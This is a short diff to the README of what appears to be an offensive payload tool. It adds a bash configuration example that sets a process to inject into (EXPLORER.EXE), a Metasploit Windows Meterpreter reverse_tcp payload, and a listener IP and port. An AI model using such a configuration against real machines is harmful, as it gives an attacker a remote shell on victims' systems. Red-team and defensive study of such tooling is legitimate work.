@@ -19,6 +19,16 @@
 | LHOST | Listener IP |
 | LPORT | Listener Port | 
 
+```
+#!/bin/bash
+...
+PROCESS_TO_INJECT="EXPLORER.EXE"
+MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
+LHOST="192.168.100.128"
+LPORT=443
+...
+```
+
 ### Payload prefixes
 | Name | Description |
 | --- | --- |
